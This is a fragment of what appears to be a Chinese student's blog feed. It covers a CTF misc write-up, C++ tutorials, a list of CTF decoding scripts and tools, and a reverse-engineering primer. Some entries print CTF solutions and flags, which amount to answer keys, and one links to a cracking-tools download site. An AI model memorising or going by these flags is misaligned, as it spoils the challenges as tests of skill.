<p>MTQyNzgxOTM0MzI3MjgwMjYwNDkyOTg1NzQ1NzU1NTc1MzQzMjEwNjIzNDkzNTI1NDM1NjI2NTY3NjY0Njk3MDQwOTI4NzQ2ODgzNTQ2NzkzNzEyMTI0NDQzODIyOTg4MjEzNDIwOTM0NTAzOTg5MDcwOTY5NzYwMDI0NTg4MDc1OTg1MzU3MzUxNzIxMjY2NTc1MDQxMzExNzE2ODQ5MDcxNzMwODY2NTk1MDUxNDM5MjAzMDAwODU4MDg4MDk2NDcyNTY3OTAzODQzNzg1NTM3ODAyODI4OTQyMzk3NTE4OTg2MjAwNDExNDMzODMzMTcwNjQ3MjcxMzY5MDM2MzQ3NzA5MzYzOTg1MTg1NDc5MDA1MTI1NDg0MTk0ODYzNjQ5MTUzOTkyNTM5NDEyNDU5MTEyMDUyNjI0OTM1OTExNTg0OTc3MDgyMTkxMjY0NTM1ODc0NTY2MzczMDI4ODg3MDEzMDMzODIyMTA3NDg2Mjk4MDAwODE4MjE2ODQyODMxODczNjg1NDM2MDE1NTk3Nzg0MzE3MzUwMDY3OTQ3NjE1NDI0MTMwMDY2MjEyMTkyMDczMjI4MDg0NDkyMzIwNTA1Nzg4NTI0MzEzNjE2Nzg3NDUzNTU3NzY5MjExMzIzNTI0MTk5MzE5MDc4MzgyMDUwMDExODQ &#x3D;</p>
</blockquote>
<p>base64 梭一下</p>
<blockquote>
<p>14278193432728026049298574575557534321062349352543562656766469704092874688354679371212444382298821342093450398907096976002458807598535735172126657504131171684907173086659505143920300085808809647256790384378553780282894239751898620041143383317064727136903634770936398518547900512548419486364915399253941245911205262493591158497708219126453587456637302888701303382210748629800081821684283187368543601559778431735006794761542413006621219207322808449232050578852431361678745355776921132352419931907838205001184</p>
</blockquote>
<p>放在线网站里梭一下 <a class="link"   href="https://tuppers-formula.ovh/#/" >https://tuppers-formula.ovh/#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/beginCTF/misc/image-20240131144910393.png"
                      alt="image-20240131144910393"
                ></p>
<blockquote>
<p>begin{T4UUPER!}</p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
        <tag>BeginCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BurpSuite抓包微信浏览器微信小程序教程</title>
    <url>/posts/806f3993.html</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>技术教程</category>
      </categories>
      <tags>
        <tag>BurpSuite</tag>
        <tag>微信小程序抓包</tag>
        <tag>微信浏览器抓包</tag>
      </tags>
  </entry>
  <entry>
    <title>C++常用的代码模板</title>
    <url>/posts/b138fb0c.html</url>
    <content><![CDATA[<h1 id="生成随机数"><a href="#生成随机数" class="headerlink" title="生成随机数"></a>生成随机数</h1><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;random&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用当前时间作为随机数生成器的种子</span></span><br><span class="line">    <span class="type">unsigned</span> seed = chrono::system_clock::<span class="built_in">now</span>().<span class="built_in">time_since_epoch</span>().<span class="built_in">count</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建一个随机数生成器</span></span><br><span class="line">    <span class="function">default_random_engine <span class="title">generator</span><span class="params">(seed)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建一个均匀分布的随机数生成器，范围从1到100</span></span><br><span class="line">    <span class="function">uniform_int_distribution&lt;<span class="type">int</span>&gt; <span class="title">distribution</span><span class="params">(<span class="number">1</span>,<span class="number">100</span>)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 生成并打印一个随机数</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Random number: &quot;</span> &lt;&lt; <span class="built_in">distribution</span>(generator) &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用当前时间作为随机数生成器的种子</span></span><br><span class="line"><span class="type">unsigned</span> seed = chrono::system_clock::<span class="built_in">now</span>().<span class="built_in">time_since_epoch</span>().<span class="built_in">count</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个随机数生成器</span></span><br><span class="line"><span class="function">default_random_engine <span class="title">generator</span><span class="params">(seed)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个均匀分布的随机数生成器，范围从1到100</span></span><br><span class="line"><span class="function">uniform_int_distribution&lt;<span class="type">int</span>&gt; <span class="title">distribution</span><span class="params">(<span class="number">1</span>,<span class="number">100</span>)</span></span>;</span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">distribution(generator)</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;chrono&gt;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++类的基本学习</title>
    <url>/posts/a8f20fc2.html</url>
    <content><![CDATA[<p>（因为上学期C++选修课没认真听，导致这学期数据结构啥也不会，好吧，出来混迟早是要还的，现在开始恶补C++）</p>
<p>目前需要学习&#x2F;复习的内容是</p>
<ol>
<li>C++类</li>
<li>C++结构体</li>
<li>template模板类</li>
<li>双链表的插入和删除</li>
<li>C++DataType的用法</li>
<li>mod运算在C++的应用<ol>
<li>保证小于最大长度</li>
<li>数组指针绕回</li>
<li>数组前移</li>
</ol>
</li>
</ol>
<hr>
<h1 id="C-类-对象"><a href="#C-类-对象" class="headerlink" title="C++ 类 &amp; 对象"></a>C++ 类 &amp; 对象</h1><p>C++ 在 C 语言的基础上增加了面向对象编程，C++ 支持面向对象程序设计。类是 C++ 的核心特性，通常被称为用户定义的类型。</p>
<p>类用于指定对象的形式，是一种用户自定义的数据类型，它是一种封装了数据和函数的组合。类中的数据称为成员变量，函数称为成员函数。类可以被看作是一种模板，可以用来创建具有相同属性和行为的多个对象。</p>
<h2 id="C-类定义"><a href="#C-类定义" class="headerlink" title="C++ 类定义"></a>C++ 类定义</h2><p>定义一个类需要使用关键字 <strong>class</strong>，然后指定类的名称，并类的主体是包含在一对花括号中，主体包含类的成员变量和成员函数。</p>
<p>定义一个类，本质上是定义一个数据类型的蓝图，它定义了类的对象包括了什么，以及可以在这个对象上执行哪些操作。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://www.runoob.com/wp-content/uploads/2015/05/cpp-classes-objects-2020-12-10-11.png"
                      alt="img"
                ></p>
<p>以下实例我们使用关键字 <strong>class</strong> 定义 Box 数据类型，包含了三个成员变量 length、breadth 和 height：</p>
<p>class Box {   public:      double length;   &#x2F;&#x2F; 盒子的长度      double breadth;  &#x2F;&#x2F; 盒子的宽度      double height;   &#x2F;&#x2F; 盒子的高度 };</p>
<p>关键字 <strong>public</strong> 确定了类成员的访问属性。在类对象作用域内，公共成员在类的外部是可访问的。您也可以指定类的成员为 <strong>private</strong> 或 <strong>protected</strong>，这个我们稍后会进行讲解。</p>
<h2 id="定义-C-对象"><a href="#定义-C-对象" class="headerlink" title="定义 C++ 对象"></a>定义 C++ 对象</h2><p>类提供了对象的蓝图，所以基本上，对象是根据类来创建的。声明类的对象，就像声明基本类型的变量一样。下面的语句声明了类 Box 的两个对象：</p>
<p>Box Box1;          &#x2F;&#x2F; 声明 Box1，类型为 Box Box Box2;          &#x2F;&#x2F; 声明 Box2，类型为 Box</p>
<p>对象 Box1 和 Box2 都有它们各自的数据成员。</p>
<h2 id="访问数据成员"><a href="#访问数据成员" class="headerlink" title="访问数据成员"></a>访问数据成员</h2><p>类的对象的公共数据成员可以使用直接成员访问运算符 <strong>.</strong> 来访问。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://www.runoob.com/wp-content/uploads/2015/05/cpp-classes-objects-2020-12-10-11-2.png"
                      alt="img"
                ></p>
<p>为了更好地理解这些概念，让我们尝试一下下面的实例：</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="type">double</span> length;   <span class="comment">// 长度</span></span><br><span class="line">      <span class="type">double</span> breadth;  <span class="comment">// 宽度</span></span><br><span class="line">      <span class="type">double</span> height;   <span class="comment">// 高度</span></span><br><span class="line">      <span class="comment">// 成员函数声明</span></span><br><span class="line">      <span class="function"><span class="type">double</span> <span class="title">get</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line">      <span class="function"><span class="type">void</span> <span class="title">set</span><span class="params">( <span class="type">double</span> len, <span class="type">double</span> bre, <span class="type">double</span> hei )</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 成员函数定义</span></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">Box::get</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> length * breadth * height;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Box::set</span><span class="params">( <span class="type">double</span> len, <span class="type">double</span> bre, <span class="type">double</span> hei)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    length = len;</span><br><span class="line">    breadth = bre;</span><br><span class="line">    height = hei;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   Box Box1;        <span class="comment">// 声明 Box1，类型为 Box</span></span><br><span class="line">   Box Box2;        <span class="comment">// 声明 Box2，类型为 Box</span></span><br><span class="line">   Box Box3;        <span class="comment">// 声明 Box3，类型为 Box</span></span><br><span class="line">   <span class="type">double</span> volume = <span class="number">0.0</span>;     <span class="comment">// 用于存储体积</span></span><br><span class="line"> </span><br><span class="line">   <span class="comment">// box 1 详述</span></span><br><span class="line">   Box<span class="number">1.</span>height = <span class="number">5.0</span>; </span><br><span class="line">   Box<span class="number">1.l</span>ength = <span class="number">6.0</span>; </span><br><span class="line">   Box<span class="number">1.</span>breadth = <span class="number">7.0</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// box 2 详述</span></span><br><span class="line">   Box<span class="number">2.</span>height = <span class="number">10.0</span>;</span><br><span class="line">   Box<span class="number">2.l</span>ength = <span class="number">12.0</span>;</span><br><span class="line">   Box<span class="number">2.</span>breadth = <span class="number">13.0</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// box 1 的体积</span></span><br><span class="line">   volume = Box<span class="number">1.</span>height * Box<span class="number">1.l</span>ength * Box<span class="number">1.</span>breadth;</span><br><span class="line">   cout &lt;&lt; <span class="string">&quot;Box1 的体积：&quot;</span> &lt;&lt; volume &lt;&lt;endl;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// box 2 的体积</span></span><br><span class="line">   volume = Box<span class="number">2.</span>height * Box<span class="number">2.l</span>ength * Box<span class="number">2.</span>breadth;</span><br><span class="line">   cout &lt;&lt; <span class="string">&quot;Box2 的体积：&quot;</span> &lt;&lt; volume &lt;&lt;endl;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">   <span class="comment">// box 3 详述</span></span><br><span class="line">   Box<span class="number">3.</span><span class="built_in">set</span>(<span class="number">16.0</span>, <span class="number">8.0</span>, <span class="number">12.0</span>); </span><br><span class="line">   volume = Box<span class="number">3.</span><span class="built_in">get</span>(); </span><br><span class="line">   cout &lt;&lt; <span class="string">&quot;Box3 的体积：&quot;</span> &lt;&lt; volume &lt;&lt;endl;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当上面的代码被编译和执行时，它会产生下列结果：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Box1 的体积：210</span><br><span class="line">Box2 的体积：1560</span><br><span class="line">Box3 的体积：1536</span><br></pre></td></tr></table></figure></div>

<p>需要注意的是，私有的成员和受保护的成员不能使用直接成员访问运算符 (.) 来直接访问。我们将在后续的教程中学习如何访问私有成员和受保护的成员。</p>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-crypto&amp;misc常用解密工具</title>
    <url>/posts/85db357.html</url>
    <content><![CDATA[<h1 id="编码解码"><a href="#编码解码" class="headerlink" title="编码解码"></a>编码解码</h1><h2 id="Python脚本"><a href="#Python脚本" class="headerlink" title="Python脚本"></a>Python脚本</h2><h3 id="base64换表脚本"><a href="#base64换表脚本" class="headerlink" title="base64换表脚本"></a>base64换表脚本</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment">#str1是要解密的代码</span></span><br><span class="line">str1 = <span class="string">&quot;5Mc58bPHLiAx7J8ocJIlaVUxaJvMcoYMaoPMaOfg15c475tscHfM/8==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#string1是改过之后的base64表</span></span><br><span class="line">string1 = <span class="string">&quot;qvEJAfHmUYjBac+u8Ph5n9Od17FrICL/X0gVtM4Qk6T2z3wNSsyoebilxWKGZpRD&quot;</span> </span><br><span class="line"></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#NSSCTF&#123;a8d4347722800e72e34e1aba3fe914ae&#125;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="变异凯撒脚本"><a href="#变异凯撒脚本" class="headerlink" title="变异凯撒脚本"></a>变异凯撒脚本</h3><p>凯撒密码作为最古老的密码体制之一,相信大多数人都知道,即简单的移位操作,那么问题来了,变异的凯撒密码又会是什么呢?<br>拿到题先比对acsii码值对比表<br>通过上面的acsii码值对比表可以看到第一个字符向后移了5,第二个向后移了6,第三个向后移了7,以此类推,很容易想到变异凯撒即每个向后移的位数是前一个加1:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">str=&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span><br><span class="line">#第一位移动的值</span><br><span class="line">k=5</span><br><span class="line">for i in str:</span><br><span class="line">    print(chr(ord(i)+k),end=&#x27;&#x27;)</span><br><span class="line">    k+=1</span><br></pre></td></tr></table></figure></div>

<h3 id="比较两个字符串输出不同的部分"><a href="#比较两个字符串输出不同的部分" class="headerlink" title="比较两个字符串输出不同的部分"></a>比较两个字符串输出不同的部分</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def compare_strings(str1, str2):</span><br><span class="line">    str11 = &quot;&quot;</span><br><span class="line">    str12 = &quot;&quot;</span><br><span class="line">    for i in range(min(len(str1), len(str2))):</span><br><span class="line">        if str1[i] != str2[i]:</span><br><span class="line">            str11+=str1[i]</span><br><span class="line">            str12+=str2[i]</span><br><span class="line">    print(str11)</span><br><span class="line">    print(str12)</span><br><span class="line"># 定义两个字符串</span><br><span class="line">str1 = &quot;第一个字符串&quot;</span><br><span class="line">str2 = &quot;第二个字符串&quot;</span><br><span class="line"></span><br><span class="line"># 调用函数</span><br><span class="line">compare_strings(str1, str2)</span><br></pre></td></tr></table></figure></div>

<h3 id="删除所有回车"><a href="#删除所有回车" class="headerlink" title="删除所有回车"></a>删除所有回车</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">text = &quot;你的文本\n包含\n回车&quot;</span><br><span class="line">new_text = text.replace(&quot;\n&quot;, &quot;&quot;)</span><br><span class="line">print(new_text)</span><br></pre></td></tr></table></figure></div>

<h2 id="在线工具包"><a href="#在线工具包" class="headerlink" title="在线工具包"></a>在线工具包</h2><ul>
<li><a class="link"   href="https://ctf.mzy0.com/CyberChef3/#recipe=Magic(3,false,false,'')" >Cyberchef的自动解密magic模式<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<blockquote>
<p>自动解密base等编码，很方便</p>
</blockquote>
<ul>
<li><a class="link"   href="https://ctf.mzy0.com/CyberChef3/" >CyberChef (mzy0.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<blockquote>
<p>Cyberchef的主站，功能强大，非常推荐</p>
</blockquote>
<ul>
<li><a class="link"   href="https://ctf.bugku.com/tools" >Bugku在线工具<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<blockquote>
<p>Bugku的在线工具包，也很齐全</p>
</blockquote>
<ul>
<li><a class="link"   href="http://www.atoolbox.net/" >一个工具箱 - 好用的在线工具都在这里！ (atoolbox.net)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<h2 id="Bugku在线工具包分包"><a href="#Bugku在线工具包分包" class="headerlink" title="Bugku在线工具包分包"></a>Bugku在线工具包分包</h2><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><h4 id="base家族"><a href="#base家族" class="headerlink" title="base家族"></a>base家族</h4><p>Base100编码解码<a class="link"   href="https://ctf.bugku.com/tool/base100" >https://ctf.bugku.com/tool/base100<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>Base92编码解码<a class="link"   href="https://ctf.bugku.com/tool/base92" >https://ctf.bugku.com/tool/base92<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>Base91编码解码<a class="link"   href="https://ctf.bugku.com/tool/base91" >https://ctf.bugku.com/tool/base91<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>Base85编码解码<a class="link"   href="https://ctf.bugku.com/tool/base85" >https://ctf.bugku.com/tool/base85<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>Base64编码解码<a class="link"   href="https://ctf.bugku.com/tool/base64" >https://ctf.bugku.com/tool/base64<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>Base62编码解码<a class="link"   href="https://ctf.bugku.com/tool/base62" >https://ctf.bugku.com/tool/base62<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>Base58编码解码<a class="link"   href="https://ctf.bugku.com/tool/base58" >https://ctf.bugku.com/tool/base58<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>Base32编码解码<a class="link"   href="https://ctf.bugku.com/tool/base32" >https://ctf.bugku.com/tool/base32<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>Base16编码解码<a class="link"   href="https://ctf.bugku.com/tool/base16" >https://ctf.bugku.com/tool/base16<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>核心价值观编码<a class="link"   href="https://ctf.bugku.com/tool/cvecode" >https://ctf.bugku.com/tool/cvecode<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>与佛论禅密码<a class="link"   href="https://ctf.bugku.com/tool/todousharp" >https://ctf.bugku.com/tool/todousharp<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h4 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h4><p>Brainfuck&#x2F;OoK<a class="link"   href="https://ctf.bugku.com/tool/brainfuck" >https://ctf.bugku.com/tool/brainfuck<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>Sojson.v5解密<a class="link"   href="https://ctf.bugku.com/tool/sojson5" >https://ctf.bugku.com/tool/sojson5<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>Sojson.v4 解密<a class="link"   href="https://ctf.bugku.com/tool/sojson4" >https://ctf.bugku.com/tool/sojson4<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h3><p>UUencode<a class="link"   href="https://ctf.bugku.com/tool/uuencode" >https://ctf.bugku.com/tool/uuencode<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>XXencode密码<a class="link"   href="https://ctf.bugku.com/tool/xxencode" >https://ctf.bugku.com/tool/xxencode<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>维基利亚密码<a class="link"   href="https://ctf.bugku.com/tool/vigenere" >https://ctf.bugku.com/tool/vigenere<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>希尔密码<a class="link"   href="https://ctf.bugku.com/tool/hill" >https://ctf.bugku.com/tool/hill<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>栅栏密码<a class="link"   href="https://ctf.bugku.com/tool/railfence" >https://ctf.bugku.com/tool/railfence<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>凯撒密码<a class="link"   href="https://ctf.bugku.com/tool/caesar" >https://ctf.bugku.com/tool/caesar<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>ADFGX密码<a class="link"   href="https://ctf.bugku.com/tool/adfgx" >https://ctf.bugku.com/tool/adfgx<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="3DES-CryptoJS-TripleDes"><a href="#3DES-CryptoJS-TripleDes" class="headerlink" title="3DES&#x2F;CryptoJS&#x2F;TripleDes"></a>3DES&#x2F;CryptoJS&#x2F;TripleDes</h3><p>TripleDes(3DES)<a class="link"   href="https://ctf.bugku.com/tool/tripledes" >https://ctf.bugku.com/tool/tripledes<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>工具很多</p>
<hr>
<p>持续更新中……</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF入门指北——reserve</title>
    <url>/posts/7237d71d.html</url>
    <content><![CDATA[<blockquote>
<p>来自西安电子科技大学Moectf</p>
</blockquote>
<h1 id="逆向工程（re"><a href="#逆向工程（re" class="headerlink" title="逆向工程（re)"></a>逆向工程（re)</h1><blockquote>
<p>来自维基</p>
</blockquote>
<blockquote>
<p>逆向工程（英语：Reverse Engineering），又称反向工程，是一种技术仿造过程。 即对一项目标产品进行逆向分析及研究，从而演绎并得出该产品的处理流程、组织结构、功能性能规 其主要目的是，在无法轻易获得必要的生产信息下，直接从成品的分析，推导产品的设计原理</p>
</blockquote>
<p>那么，我们要做的是对于软件的逆向工程</p>
<p>一般，CTF中的逆向工程题目形式为：程序接收用户的一个输入，并在程序中进行一系 列校验算法，如通过校验则提示成功，此时的输入即flag。这些校验算法可以是已经成 熟的加解密方案，也可以是作者自创的某种算法。比如，一个小游戏将用户的输入作为 游戏的操作步骤进行判断等。这类题目要求参赛者具备一定的算法能力、思维能力，甚 至联想能力。</p>
<p>我们知道，我们可以阅读源代码，了解一个程序的功能 但是一个程序不一定需要源代码才能运行。 事实上，我们在运行可执行文件，那么他 们打开来实际上是一些二进制数据。</p>
<p> 例如下面这一段程序源码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello world&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们使用记事本打开就能看到逻辑。但是真正编译出来的，我们用来运行的程序，使用 记事本打开是这样的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://z1.ax1x.com/2023/09/13/pPRF6uF.png"
                     
                ></p>
<p>这些二进制数据直接无法识读，但是包含了程序执行所需要的东西，而我们的工作就 是，识读他们，找到flag！</p>
<h1 id="如何开始逆向呢"><a href="#如何开始逆向呢" class="headerlink" title="如何开始逆向呢"></a>如何开始逆向呢</h1><p>ctf中的逆向（ reverse ）涉及很多编程语言，最常见的是C、C++ 、python、java、C#，或者一 常见的编程语言golang、rust、lisp等等。 除了windows与linux系统下可执行文件的逆向，还经常遇到安卓的（ apk ）逆向、系统驱动、固 件逆向等等。 但是作为一个 beginner ，你不需要在刚入门的时候就去掌握这么多的编程语言 从C语言以及C语言逆向开始，是一个比较好的选择 因为C语言十分接近高级语言，又有充分的系统底层的支持 同时入门的逆向题很多是用C语言写的 并且当你学会了C语言，尽管你无法使用java、python等语言进行编程，但是你会发现，看懂这些高 语言写的代码还是比较容易的。</p>
<h1 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h1><blockquote>
<p>来自含树</p>
</blockquote>
<h2 id="常用工具介绍"><a href="#常用工具介绍" class="headerlink" title="常用工具介绍"></a>常用工具介绍</h2><h3 id="1．IDA-Pro"><a href="#1．IDA-Pro" class="headerlink" title="1．IDA Pro"></a>1．IDA Pro</h3><p>IDA（Interactive DisAssembler）Pro（以下简称IDA）是一款强大的可执行文件分析工 具，可以对包括但不限于x86&#x2F;x64、ARM、MIPS等架构，PE、ELF等格式的可执行文件进行静态分析和动态调试。IDA集成了Hex-Rays Decompiler，提供了从汇编语言到C 语言伪代码的反编译功能，可以极大地减少分析程序时的工作量</p>
<h3 id="2．OllyDbg和x64dbg"><a href="#2．OllyDbg和x64dbg" class="headerlink" title="2．OllyDbg和x64dbg"></a>2．OllyDbg和x64dbg</h3><p>OllyDbg是Windows 32位环境下一款优秀的调试器，最强大的功能是可扩展性，许多开 发者为其开发了具备各种功能的插件，能够绕过许多软件保护措施。但OllyDbg在64位 环境下已经不能使用，许多人因此转而使用了x64dbg。</p>
<h1 id="这些怎么下载？"><a href="#这些怎么下载？" class="headerlink" title="这些怎么下载？"></a>这些怎么下载？</h1><p><a class="link"   href="https://down.52pojie.cn/" >爱盘 - 最新的在线破解工具包 (52pojie.cn)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h1 id="下好了怎么用呢"><a href="#下好了怎么用呢" class="headerlink" title="下好了怎么用呢"></a>下好了怎么用呢</h1><p>推荐查阅一些书籍，如 《从0到1：CTFer成长之路》 re篇 </p>
<p>或者直接b站搜ctf re入门</p>
<p> 以及第一题的bin在压缩包里，试试ida吧，你会需要它的。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>CTF入门指北</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF入门指北——web</title>
    <url>/posts/c162917a.html</url>
